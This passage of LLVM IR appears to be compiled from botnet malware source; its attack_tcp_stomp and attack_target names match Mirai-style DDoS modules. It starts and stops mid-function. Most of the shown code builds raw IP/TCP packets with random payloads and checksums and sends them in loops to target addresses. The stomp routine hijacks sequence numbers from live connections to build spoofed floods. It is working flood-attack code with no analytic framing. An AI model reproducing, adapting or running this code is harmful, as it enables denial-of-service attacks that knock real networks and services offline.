  %129 = getelementptr inbounds i8, i8* %125, i64 40
  store i8 69, i8* %125, align 4
  %130 = getelementptr inbounds i8, i8* %125, i64 1
  store i8 %10, i8* %130, align 1
  %131 = call zeroext i16 @htons(i16 zeroext %49) #10
  %132 = getelementptr inbounds i8, i8* %125, i64 2
  %133 = bitcast i8* %132 to i16*
  store i16 %131, i16* %133, align 2
  %134 = call zeroext i16 @htons(i16 zeroext %12) #10
  %135 = getelementptr inbounds i8, i8* %125, i64 4
  %136 = bitcast i8* %135 to i16*
  store i16 %134, i16* %136, align 4
  %137 = getelementptr inbounds i8, i8* %125, i64 8
  store i8 %14, i8* %137, align 4
  %138 = call zeroext i16 @htons(i16 zeroext 16384) #10
  %139 = getelementptr inbounds i8, i8* %125, i64 6
  %140 = bitcast i8* %139 to i16*
  store i16 %138, i16* %140, align 2
  %141 = getelementptr inbounds i8, i8* %125, i64 9
  store i8 6, i8* %141, align 1
  %142 = getelementptr inbounds i8, i8* %125, i64 12
  %143 = bitcast i8* %142 to i32*
  store i32 %39, i32* %143, align 4
  %144 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %126, i32 1
  %145 = load i32, i32* %144, align 4
  %146 = getelementptr inbounds i8, i8* %125, i64 16
  %147 = bitcast i8* %146 to i32*
  store i32 %145, i32* %147, align 4
  %148 = call zeroext i16 @htons(i16 zeroext %18) #10
  %149 = bitcast i8* %128 to i16*
  store i16 %148, i16* %149, align 4
  %150 = call zeroext i16 @htons(i16 zeroext %20) #10
  %151 = getelementptr inbounds i8, i8* %125, i64 22
  %152 = bitcast i8* %151 to i16*
  store i16 %150, i16* %152, align 2
  %153 = call zeroext i16 @htons(i16 zeroext %51) #10
  %154 = zext i16 %153 to i32
  %155 = getelementptr inbounds i8, i8* %125, i64 24
  %156 = bitcast i8* %155 to i32*
  store i32 %154, i32* %156, align 4
  %157 = getelementptr inbounds i8, i8* %125, i64 32
  %158 = bitcast i8* %157 to i16*
  store i16 %.134, i16* %158, align 4
  call void @rand_str(i8* nonnull %129, i32 %35)
  %159 = load i32, i32* %5, align 4
  %160 = add nsw i32 %159, 1
  store i32 %160, i32* %5, align 4
  %161 = icmp slt i32 %160, %46
  br i1 %161, label %.lr.ph129.split, label %.preheader.loopexit138

.loopexit.loopexit:                               ; preds = %201
  br label %.loopexit.backedge

.loopexit.loopexit137:                            ; preds = %259
  br label %.loopexit.backedge

.loopexit:                                        ; preds = %.loopexit.backedge, %.preheader
  store i32 0, i32* %5, align 4
  br i1 %47, label %.loopexit.backedge, label %.lr.ph

.loopexit.backedge:                               ; preds = %.loopexit, %.loopexit.loopexit, %.loopexit.loopexit137
  br label %.loopexit

.lr.ph:                                           ; preds = %.loopexit
  br i1 %109, label %.lr.ph.split.us.preheader, label %.lr.ph.split.preheader

.lr.ph.split.preheader:                           ; preds = %.lr.ph
  br label %.lr.ph.split

.lr.ph.split.us.preheader:                        ; preds = %.lr.ph
  br label %.lr.ph.split.us

.lr.ph.split.us:                                  ; preds = %.lr.ph.split.us.preheader, %201
  %storemerge121128.us = phi i32 [ %220, %201 ], [ 0, %.lr.ph.split.us.preheader ]
  %162 = sext i32 %storemerge121128.us to i64
  %163 = getelementptr inbounds i8*, i8** %8, i64 %162
  %164 = load i8*, i8** %163, align 8
  %165 = bitcast i8* %164 to %struct.iphdr*
  %166 = getelementptr inbounds i8, i8* %164, i64 20
  %167 = getelementptr inbounds i8, i8* %164, i64 40
  %168 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %162, i32 2
  %169 = load i8, i8* %168, align 4
  %170 = icmp ult i8 %169, 32
  br i1 %170, label %171, label %178

; <label>:171:                                    ; preds = %.lr.ph.split.us
  %172 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %162, i32 1
  %173 = load i32, i32* %172, align 4
  %174 = call i32 @ntohl(i32 %173) #10
  %175 = call i32 @htonl(i32 %174) #10
  %176 = getelementptr inbounds i8, i8* %164, i64 16
  %177 = bitcast i8* %176 to i32*
  store i32 %175, i32* %177, align 4
  br label %178

; <label>:178:                                    ; preds = %.lr.ph.split.us, %171
  %179 = getelementptr inbounds i8, i8* %164, i64 12
  %180 = bitcast i8* %179 to i32*
  store i32 0, i32* %180, align 4
  br i1 %111, label %181, label %184

; <label>:181:                                    ; preds = %178
  %182 = getelementptr inbounds i8, i8* %164, i64 4
  %183 = bitcast i8* %182 to i16*
  store i16 0, i16* %183, align 4
  br label %184

; <label>:184:                                    ; preds = %181, %178
  br i1 %113, label %185, label %187

; <label>:185:                                    ; preds = %184
  %186 = bitcast i8* %166 to i16*
  store i16 0, i16* %186, align 4
  br label %187

; <label>:187:                                    ; preds = %185, %184
  br i1 %115, label %188, label %191

; <label>:188:                                    ; preds = %187
  %189 = getelementptr inbounds i8, i8* %164, i64 22
  %190 = bitcast i8* %189 to i16*
  store i16 0, i16* %190, align 2
  br label %191

; <label>:191:                                    ; preds = %188, %187
  br i1 %116, label %192, label %195

; <label>:192:                                    ; preds = %191
  %193 = getelementptr inbounds i8, i8* %164, i64 24
  %194 = bitcast i8* %193 to i32*
  store i32 0, i32* %194, align 4
  br label %195

; <label>:195:                                    ; preds = %192, %191
  br i1 %117, label %196, label %199

; <label>:196:                                    ; preds = %195
  %197 = getelementptr inbounds i8, i8* %164, i64 28
  %198 = bitcast i8* %197 to i32*
  store i32 0, i32* %198, align 4
  br label %199

; <label>:199:                                    ; preds = %196, %195
  br i1 %118, label %201, label %200

; <label>:200:                                    ; preds = %199
  call void @rand_str(i8* nonnull %167, i32 %35)
  br label %201

; <label>:201:                                    ; preds = %200, %199
  %202 = getelementptr inbounds i8, i8* %164, i64 10
  %203 = bitcast i8* %202 to i16*
  store i16 0, i16* %203, align 2
  %204 = bitcast i8* %164 to i16*
  %205 = call zeroext i16 @checksum_generic(i16* %204, i32 20) #9
  store i16 %205, i16* %203, align 2
  %206 = getelementptr inbounds i8, i8* %164, i64 36
  %207 = bitcast i8* %206 to i16*
  store i16 0, i16* %207, align 4
  %208 = call zeroext i16 @htons(i16 zeroext %121) #10
  %209 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* nonnull %165, i8* nonnull %166, i16 zeroext %208, i32 %122) #9
  store i16 %209, i16* %207, align 4
  %210 = getelementptr inbounds i8, i8* %164, i64 22
  %211 = bitcast i8* %210 to i16*
  %212 = load i16, i16* %211, align 2
  %213 = load i32, i32* %5, align 4
  %214 = sext i32 %213 to i64
  %215 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %214, i32 0, i32 1
  store i16 %212, i16* %215, align 2
  %216 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %214, i32 0
  %217 = bitcast %struct.sockaddr_in* %216 to %struct.sockaddr*
  %218 = call i64 @sendto(i32 %40, i8* nonnull %164, i64 %123, i32 16384, %struct.sockaddr* %217, i32 16) #9
  %219 = load i32, i32* %5, align 4
  %220 = add nsw i32 %219, 1
  store i32 %220, i32* %5, align 4
  %221 = icmp slt i32 %220, %46
  br i1 %221, label %.lr.ph.split.us, label %.loopexit.loopexit

.lr.ph.split:                                     ; preds = %.lr.ph.split.preheader, %259
  %storemerge121128 = phi i32 [ %278, %259 ], [ 0, %.lr.ph.split.preheader ]
  %222 = sext i32 %storemerge121128 to i64
  %223 = getelementptr inbounds i8*, i8** %8, i64 %222
  %224 = load i8*, i8** %223, align 8
  %225 = bitcast i8* %224 to %struct.iphdr*
  %226 = getelementptr inbounds i8, i8* %224, i64 20
  %227 = getelementptr inbounds i8, i8* %224, i64 40
  %228 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %222, i32 2
  %229 = load i8, i8* %228, align 4
  %230 = icmp ult i8 %229, 32
  br i1 %230, label %231, label %238

; <label>:231:                                    ; preds = %.lr.ph.split
  %232 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %222, i32 1
  %233 = load i32, i32* %232, align 4
  %234 = call i32 @ntohl(i32 %233) #10
  %235 = call i32 @htonl(i32 %234) #10
  %236 = getelementptr inbounds i8, i8* %224, i64 16
  %237 = bitcast i8* %236 to i32*
  store i32 %235, i32* %237, align 4
  br label %238

; <label>:238:                                    ; preds = %.lr.ph.split, %231
  br i1 %111, label %239, label %242

; <label>:239:                                    ; preds = %238
  %240 = getelementptr inbounds i8, i8* %224, i64 4
  %241 = bitcast i8* %240 to i16*
  store i16 0, i16* %241, align 4
  br label %242

; <label>:242:                                    ; preds = %239, %238
  br i1 %113, label %243, label %245

; <label>:243:                                    ; preds = %242
  %244 = bitcast i8* %226 to i16*
  store i16 0, i16* %244, align 4
  br label %245

; <label>:245:                                    ; preds = %243, %242
  br i1 %115, label %246, label %249

; <label>:246:                                    ; preds = %245
  %247 = getelementptr inbounds i8, i8* %224, i64 22
  %248 = bitcast i8* %247 to i16*
  store i16 0, i16* %248, align 2
  br label %249

; <label>:249:                                    ; preds = %246, %245
  br i1 %116, label %250, label %253

; <label>:250:                                    ; preds = %249
  %251 = getelementptr inbounds i8, i8* %224, i64 24
  %252 = bitcast i8* %251 to i32*
  store i32 0, i32* %252, align 4
  br label %253

; <label>:253:                                    ; preds = %250, %249
  br i1 %117, label %254, label %257

; <label>:254:                                    ; preds = %253
  %255 = getelementptr inbounds i8, i8* %224, i64 28
  %256 = bitcast i8* %255 to i32*
  store i32 0, i32* %256, align 4
  br label %257

; <label>:257:                                    ; preds = %254, %253
  br i1 %118, label %259, label %258

; <label>:258:                                    ; preds = %257
  call void @rand_str(i8* %227, i32 %35)
  br label %259

; <label>:259:                                    ; preds = %257, %258
  %260 = getelementptr inbounds i8, i8* %224, i64 10
  %261 = bitcast i8* %260 to i16*
  store i16 0, i16* %261, align 2
  %262 = bitcast i8* %224 to i16*
  %263 = call zeroext i16 @checksum_generic(i16* %262, i32 20) #9
  store i16 %263, i16* %261, align 2
  %264 = getelementptr inbounds i8, i8* %224, i64 36
  %265 = bitcast i8* %264 to i16*
  store i16 0, i16* %265, align 4
  %266 = call zeroext i16 @htons(i16 zeroext %121) #10
  %267 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %225, i8* %226, i16 zeroext %266, i32 %122) #9
  store i16 %267, i16* %265, align 4
  %268 = getelementptr inbounds i8, i8* %224, i64 22
  %269 = bitcast i8* %268 to i16*
  %270 = load i16, i16* %269, align 2
  %271 = load i32, i32* %5, align 4
  %272 = sext i32 %271 to i64
  %273 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %272, i32 0, i32 1
  store i16 %270, i16* %273, align 2
  %274 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %272, i32 0
  %275 = bitcast %struct.sockaddr_in* %274 to %struct.sockaddr*
  %276 = call i64 @sendto(i32 %40, i8* %224, i64 %123, i32 16384, %struct.sockaddr* %275, i32 16) #9
  %277 = load i32, i32* %5, align 4
  %278 = add nsw i32 %277, 1
  store i32 %278, i32* %5, align 4
  %279 = icmp slt i32 %278, %46
  br i1 %279, label %.lr.ph.split, label %.loopexit.loopexit137

; <label>:280:                                    ; preds = %4, %107
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_tcp_stomp(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %5 = alloca i32, align 4
  %6 = alloca %struct.sockaddr_in, align 4
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca i32, align 4
  %9 = alloca [256 x i8], align 16
  %10 = zext i8 %0 to i64
  %11 = tail call noalias i8* @calloc(i64 %10, i64 16) #9
  %12 = bitcast i8* %11 to %struct.attack_stomp_data*
  %13 = tail call noalias i8* @calloc(i64 %10, i64 8) #9
  %14 = bitcast i8* %13 to i8**
  %15 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 2, i32 0)
  %16 = trunc i32 %15 to i8
  %17 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 3, i32 65535)
  %18 = trunc i32 %17 to i16
  %19 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 4, i32 64)
  %20 = trunc i32 %19 to i8
  %21 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 5, i32 1)
  %22 = trunc i32 %21 to i8
  %23 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 7, i32 65535)
  %24 = trunc i32 %23 to i16
  %25 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 11, i32 0)
  %26 = trunc i32 %25 to i16
  %27 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 12, i32 1)
  %28 = trunc i32 %27 to i16
  %29 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 13, i32 1)
  %30 = trunc i32 %29 to i16
  %31 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 14, i32 0)
  %32 = trunc i32 %31 to i16
  %33 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 15, i32 0)
  %34 = trunc i32 %33 to i16
  %35 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 16, i32 0)
  %36 = trunc i32 %35 to i16
  %37 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 0, i32 768)
  %38 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 1, i32 1)
  %39 = trunc i32 %38 to i8
  %40 = tail call i32 @socket(i32 2, i32 3, i32 6) #9
  %41 = icmp eq i32 %40, -1
  br i1 %41, label %.loopexit150, label %42

; <label>:42:                                     ; preds = %4
  store i32 1, i32* %5, align 4
  %43 = bitcast i32* %5 to i8*
  %44 = call i32 @setsockopt(i32 %40, i32 0, i32 3, i8* nonnull %43, i32 4) #9
  %45 = icmp eq i32 %44, -1
  br i1 %45, label %82, label %.preheader153

.preheader153:                                    ; preds = %42
  store i32 0, i32* %5, align 4
  %46 = zext i8 %0 to i32
  %47 = icmp eq i8 %0, 0
  br i1 %47, label %.preheader153..preheader_crit_edge, label %.preheader151.lr.ph

.preheader153..preheader_crit_edge:               ; preds = %.preheader153
  %.pre = sext i32 %37 to i64
  %.pre174 = add nsw i64 %.pre, 40
  br label %.preheader

.preheader151.lr.ph:                              ; preds = %.preheader153
  %48 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i64 0, i32 0
  %49 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i64 0, i32 2, i32 0
  %50 = and i32 %23, 65535
  %51 = icmp eq i32 %50, 65535
  %52 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i64 0, i32 1
  %53 = bitcast %struct.sockaddr_in* %6 to %struct.sockaddr*
  %54 = getelementptr inbounds [256 x i8], [256 x i8]* %9, i64 0, i64 0
  %55 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %56 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i64 0, i32 2, i32 0
  %57 = getelementptr inbounds [256 x i8], [256 x i8]* %9, i64 0, i64 20
  %58 = bitcast i8* %57 to i16*
  %59 = getelementptr inbounds [256 x i8], [256 x i8]* %9, i64 0, i64 32
  %60 = bitcast i8* %59 to i16*
  %61 = sext i32 %37 to i64
  %62 = add nsw i64 %61, 40
  %63 = trunc i64 %62 to i16
  %64 = icmp eq i8 %22, 0
  %65 = shl i16 %26, 13
  %66 = and i16 %65, 8192
  %67 = shl i16 %28, 12
  %68 = and i16 %67, 4096
  %69 = shl i16 %30, 11
  %70 = and i16 %69, 2048
  %71 = shl i16 %32, 10
  %72 = and i16 %71, 1024
  %73 = shl i16 %34, 9
  %74 = and i16 %73, 512
  %75 = shl i16 %36, 8
  %76 = and i16 %75, 256
  %77 = or i16 %68, %66
  %78 = or i16 %77, %70
  %79 = or i16 %78, %72
  %.masked = or i16 %79, %74
  %80 = or i16 %.masked, %76
  %81 = or i16 %80, 128
  br label %.preheader151

; <label>:82:                                     ; preds = %42
  %83 = call i32 @close(i32 %40) #9
  br label %.loopexit150

.preheader151:                                    ; preds = %.preheader151.lr.ph, %.loopexit152
  %.0162 = phi %struct.tcphdr* [ undef, %.preheader151.lr.ph ], [ %.1, %.loopexit152 ]
  %84 = call i32 @socket(i32 2, i32 1, i32 0) #9
  %85 = icmp eq i32 %84, -1
  br i1 %85, label %.loopexit152, label %.lr.ph161

.lr.ph161:                                        ; preds = %.preheader151
  br i1 %51, label %.lr.ph161.split.us.preheader, label %.lr.ph161.split.preheader

.lr.ph161.split.preheader:                        ; preds = %.lr.ph161
  br label %.lr.ph161.split

.lr.ph161.split.us.preheader:                     ; preds = %.lr.ph161
  br label %.lr.ph161.split.us

.lr.ph161.split.us:                               ; preds = %.lr.ph161.split.us.preheader, %.backedge.us
  %86 = phi i32 [ %133, %.backedge.us ], [ %84, %.lr.ph161.split.us.preheader ]
  %87 = call i32 (i32, i32, ...) @fcntl(i32 %86, i32 3, i32 0) #9
  %88 = or i32 %87, 2048
  %89 = call i32 (i32, i32, ...) @fcntl(i32 %86, i32 4, i32 %88) #9
  store i16 2, i16* %48, align 4
  %90 = load i32, i32* %5, align 4
  %91 = sext i32 %90 to i64
  %92 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %91, i32 2
  %93 = load i8, i8* %92, align 4
  %94 = icmp ult i8 %93, 32
  %95 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %91, i32 1
  %96 = load i32, i32* %95, align 4
  br i1 %94, label %97, label %100

; <label>:97:                                     ; preds = %.lr.ph161.split.us
  %98 = call i32 @ntohl(i32 %96) #10
  %99 = call i32 @htonl(i32 %98) #10
  br label %100

; <label>:100:                                    ; preds = %97, %.lr.ph161.split.us
  %.sink.us = phi i32 [ %99, %97 ], [ %96, %.lr.ph161.split.us ]
  store i32 %.sink.us, i32* %49, align 4
  store i16 0, i16* %52, align 2
  %101 = call i32 @connect(i32 %86, %struct.sockaddr* nonnull %53, i32 16) #9
  %102 = call i64 @time(i64* null) #9
  br label %103

; <label>:103:                                    ; preds = %127, %100
  store i32 16, i32* %8, align 4
  %104 = call i64 @recvfrom(i32 %40, i8* nonnull %54, i64 256, i32 16384, %struct.sockaddr* nonnull %55, i32* nonnull %8) #9
  %105 = trunc i64 %104 to i32
  %106 = icmp eq i32 %105, -1
  br i1 %106, label %.loopexit150.loopexit, label %107

; <label>:107:                                    ; preds = %103
  %108 = load i32, i32* %56, align 4
  %109 = load i32, i32* %49, align 4
  %110 = icmp eq i32 %108, %109
  br i1 %110, label %111, label %127

; <label>:111:                                    ; preds = %107
  %sext.us = shl i64 %104, 32
  %112 = ashr exact i64 %sext.us, 32
  %113 = icmp ugt i64 %112, 40
  br i1 %113, label %114, label %127

; <label>:114:                                    ; preds = %111
  %115 = load i16, i16* %58, align 4
  %116 = load i16, i16* %52, align 2
  %117 = icmp eq i16 %115, %116
  br i1 %117, label %118, label %127

; <label>:118:                                    ; preds = %114
  %119 = load i16, i16* %60, align 16
  %120 = and i16 %119, 4608
  %121 = icmp eq i16 %120, 4608
  br i1 %121, label %.us-lcssa.us.loopexit, label %122

; <label>:122:                                    ; preds = %118
  %123 = and i16 %119, 1280
  %124 = icmp eq i16 %123, 0
  br i1 %124, label %127, label %125

; <label>:125:                                    ; preds = %122
  %126 = call i32 @close(i32 %86) #9
  br label %.backedge.us

; <label>:127:                                    ; preds = %122, %114, %111, %107
  %128 = call i64 @time(i64* null) #9
  %129 = sub nsw i64 %128, %102
  %130 = icmp sgt i64 %129, 10
  br i1 %130, label %131, label %103

; <label>:131:                                    ; preds = %127
  %132 = call i32 @close(i32 %86) #9
  br label %.backedge.us

.backedge.us:                                     ; preds = %131, %125
  %133 = call i32 @socket(i32 2, i32 1, i32 0) #9
  %134 = icmp eq i32 %133, -1
  br i1 %134, label %.loopexit152.loopexit, label %.lr.ph161.split.us

.preheader.loopexit:                              ; preds = %.loopexit152
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit, %.preheader153..preheader_crit_edge
  %.pre-phi175 = phi i64 [ %.pre174, %.preheader153..preheader_crit_edge ], [ %62, %.preheader.loopexit ]
  %.pre-phi = phi i64 [ %.pre, %.preheader153..preheader_crit_edge ], [ %61, %.preheader.loopexit ]
  %135 = and i32 %17, 65535
  %136 = icmp eq i32 %135, 65535
  %137 = icmp eq i8 %39, 0
  %138 = add nsw i64 %.pre-phi, 20
  %139 = trunc i64 %138 to i16
  %140 = trunc i64 %138 to i32
  br label %.loopexit

.lr.ph161.split:                                  ; preds = %.lr.ph161.split.preheader, %.backedge
  %141 = phi i32 [ %235, %.backedge ], [ %84, %.lr.ph161.split.preheader ]
  %142 = call i32 (i32, i32, ...) @fcntl(i32 %141, i32 3, i32 0) #9
  %143 = or i32 %142, 2048
  %144 = call i32 (i32, i32, ...) @fcntl(i32 %141, i32 4, i32 %143) #9
  store i16 2, i16* %48, align 4
  %145 = load i32, i32* %5, align 4
  %146 = sext i32 %145 to i64
  %147 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %146, i32 2
  %148 = load i8, i8* %147, align 4
  %149 = icmp ult i8 %148, 32
  %150 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %146, i32 1
  %151 = load i32, i32* %150, align 4
  br i1 %149, label %152, label %155

; <label>:152:                                    ; preds = %.lr.ph161.split
  %153 = call i32 @ntohl(i32 %151) #10
  %154 = call i32 @htonl(i32 %153) #10
  br label %155

; <label>:155:                                    ; preds = %.lr.ph161.split, %152
  %.sink = phi i32 [ %154, %152 ], [ %151, %.lr.ph161.split ]
  store i32 %.sink, i32* %49, align 4
  %156 = call zeroext i16 @htons(i16 zeroext %24) #10
  store i16 %156, i16* %52, align 2
  %157 = call i32 @connect(i32 %141, %struct.sockaddr* nonnull %53, i32 16) #9
  %158 = call i64 @time(i64* null) #9
  br label %159

; <label>:159:                                    ; preds = %237, %155
  store i32 16, i32* %8, align 4
  %160 = call i64 @recvfrom(i32 %40, i8* nonnull %54, i64 256, i32 16384, %struct.sockaddr* nonnull %55, i32* nonnull %8) #9
  %161 = trunc i64 %160 to i32
  %162 = icmp eq i32 %161, -1
  br i1 %162, label %.loopexit150.loopexit203, label %163

; <label>:163:                                    ; preds = %159
  %164 = load i32, i32* %56, align 4
  %165 = load i32, i32* %49, align 4
  %166 = icmp eq i32 %164, %165
  br i1 %166, label %167, label %237

; <label>:167:                                    ; preds = %163
  %sext = shl i64 %160, 32
  %168 = ashr exact i64 %sext, 32
  %169 = icmp ugt i64 %168, 40
  br i1 %169, label %170, label %237

; <label>:170:                                    ; preds = %167
  %171 = load i16, i16* %58, align 4
  %172 = load i16, i16* %52, align 2
  %173 = icmp eq i16 %171, %172
  br i1 %173, label %174, label %237

; <label>:174:                                    ; preds = %170
  %175 = load i16, i16* %60, align 16
  %176 = and i16 %175, 4608
  %177 = icmp eq i16 %176, 4608
  br i1 %177, label %.us-lcssa.us.loopexit204, label %230

.us-lcssa.us.loopexit:                            ; preds = %118
  br label %.us-lcssa.us

.us-lcssa.us.loopexit204:                         ; preds = %174
  br label %.us-lcssa.us

.us-lcssa.us:                                     ; preds = %.us-lcssa.us.loopexit204, %.us-lcssa.us.loopexit
  %178 = phi i16 [ %115, %.us-lcssa.us.loopexit ], [ %171, %.us-lcssa.us.loopexit204 ]
  %179 = phi i32 [ %108, %.us-lcssa.us.loopexit ], [ %164, %.us-lcssa.us.loopexit204 ]
  %180 = load i32, i32* %5, align 4
  %181 = sext i32 %180 to i64
  %182 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %12, i64 %181, i32 0
  store i32 %179, i32* %182, align 4
  %183 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %.0162, i64 0, i32 2
  %184 = load i32, i32* %183, align 4
  %185 = call i32 @ntohl(i32 %184) #10
  %186 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %12, i64 %181, i32 1
  store i32 %185, i32* %186, align 4
  %187 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %.0162, i64 0, i32 3
  %188 = load i32, i32* %187, align 4
  %189 = call i32 @ntohl(i32 %188) #10
  %190 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %12, i64 %181, i32 2
  store i32 %189, i32* %190, align 4
  %191 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %.0162, i64 0, i32 1
  %192 = load i16, i16* %191, align 2
  %193 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %12, i64 %181, i32 3
  store i16 %192, i16* %193, align 4
  %194 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %12, i64 %181, i32 4
  store i16 %178, i16* %194, align 2
  %195 = call noalias i8* @malloc(i64 %62) #9
  %196 = getelementptr inbounds i8*, i8** %14, i64 %181
  store i8* %195, i8** %196, align 8
  %197 = getelementptr inbounds i8, i8* %195, i64 20
  %198 = bitcast i8* %197 to %struct.tcphdr*
  %199 = getelementptr inbounds i8, i8* %195, i64 40
  store i8 69, i8* %195, align 4
  %200 = getelementptr inbounds i8, i8* %195, i64 1
  store i8 %16, i8* %200, align 1
  %201 = call zeroext i16 @htons(i16 zeroext %63) #10
  %202 = getelementptr inbounds i8, i8* %195, i64 2
  %203 = bitcast i8* %202 to i16*
  store i16 %201, i16* %203, align 2
  %204 = call zeroext i16 @htons(i16 zeroext %18) #10
  %205 = getelementptr inbounds i8, i8* %195, i64 4
  %206 = bitcast i8* %205 to i16*
  store i16 %204, i16* %206, align 4
  %207 = getelementptr inbounds i8, i8* %195, i64 8
  store i8 %20, i8* %207, align 4
  br i1 %64, label %212, label %208

; <label>:208:                                    ; preds = %.us-lcssa.us
  %209 = call zeroext i16 @htons(i16 zeroext 16384) #10
  %210 = getelementptr inbounds i8, i8* %195, i64 6
  %211 = bitcast i8* %210 to i16*
  store i16 %209, i16* %211, align 2
  br label %212

; <label>:212:                                    ; preds = %.us-lcssa.us, %208
  %213 = getelementptr inbounds i8, i8* %195, i64 9
  store i8 6, i8* %213, align 1
  %214 = load i32, i32* @LOCAL_ADDR, align 4
  %215 = getelementptr inbounds i8, i8* %195, i64 12
  %216 = bitcast i8* %215 to i32*
  store i32 %214, i32* %216, align 4
  %217 = getelementptr inbounds i8, i8* %195, i64 16
  %218 = bitcast i8* %217 to i32*
  store i32 %179, i32* %218, align 4
  %219 = bitcast i8* %197 to i16*
  store i16 %192, i16* %219, align 4
  %220 = getelementptr inbounds i8, i8* %195, i64 22
  %221 = bitcast i8* %220 to i16*
  store i16 %178, i16* %221, align 2
  %222 = getelementptr inbounds i8, i8* %195, i64 24
  %223 = bitcast i8* %222 to i32*
  store i32 %189, i32* %223, align 4
  %224 = getelementptr inbounds i8, i8* %195, i64 28
  %225 = bitcast i8* %224 to i32*
  store i32 %185, i32* %225, align 4
  %226 = getelementptr inbounds i8, i8* %195, i64 32
  %227 = bitcast i8* %226 to i16*
  %228 = getelementptr inbounds i8, i8* %195, i64 34
  %229 = bitcast i8* %228 to i16*
  store i16 0, i16* %229, align 2
  store i16 %81, i16* %227, align 4
  call void @rand_str(i8* %199, i32 %37)
  br label %.loopexit152

; <label>:230:                                    ; preds = %174
  %231 = and i16 %175, 1280
  %232 = icmp eq i16 %231, 0
  br i1 %232, label %237, label %233

; <label>:233:                                    ; preds = %230
  %234 = call i32 @close(i32 %141) #9
  br label %.backedge

.backedge:                                        ; preds = %233, %241
  %235 = call i32 @socket(i32 2, i32 1, i32 0) #9
  %236 = icmp eq i32 %235, -1
  br i1 %236, label %.loopexit152.loopexit205, label %.lr.ph161.split

; <label>:237:                                    ; preds = %230, %170, %167, %163
  %238 = call i64 @time(i64* null) #9
  %239 = sub nsw i64 %238, %158
  %240 = icmp sgt i64 %239, 10
  br i1 %240, label %241, label %159

; <label>:241:                                    ; preds = %237
  %242 = call i32 @close(i32 %141) #9
  br label %.backedge

.loopexit152.loopexit:                            ; preds = %.backedge.us
  br label %.loopexit152

.loopexit152.loopexit205:                         ; preds = %.backedge
  br label %.loopexit152

.loopexit152:                                     ; preds = %.loopexit152.loopexit205, %.loopexit152.loopexit, %.preheader151, %212
  %.1 = phi %struct.tcphdr* [ %198, %212 ], [ %.0162, %.preheader151 ], [ %.0162, %.loopexit152.loopexit ], [ %.0162, %.loopexit152.loopexit205 ]
  %243 = load i32, i32* %5, align 4
  %244 = add nsw i32 %243, 1
  store i32 %244, i32* %5, align 4
  %245 = icmp slt i32 %244, %46
  br i1 %245, label %.preheader151, label %.preheader.loopexit

.loopexit.loopexit:                               ; preds = %255
  br label %.loopexit.backedge

.loopexit.loopexit202:                            ; preds = %300
  br label %.loopexit.backedge

.loopexit:                                        ; preds = %.loopexit.backedge, %.preheader
  store i32 0, i32* %5, align 4
  br i1 %47, label %.loopexit.backedge, label %.lr.ph

.loopexit.backedge:                               ; preds = %.loopexit, %.loopexit.loopexit, %.loopexit.loopexit202
  br label %.loopexit

.lr.ph:                                           ; preds = %.loopexit
  br i1 %136, label %.lr.ph.split.us.preheader, label %.lr.ph.split.preheader

.lr.ph.split.preheader:                           ; preds = %.lr.ph
  br label %.lr.ph.split

.lr.ph.split.us.preheader:                        ; preds = %.lr.ph
  br label %.lr.ph.split.us

.lr.ph.split.us:                                  ; preds = %.lr.ph.split.us.preheader, %255
  %storemerge139160.us = phi i32 [ %291, %255 ], [ 0, %.lr.ph.split.us.preheader ]
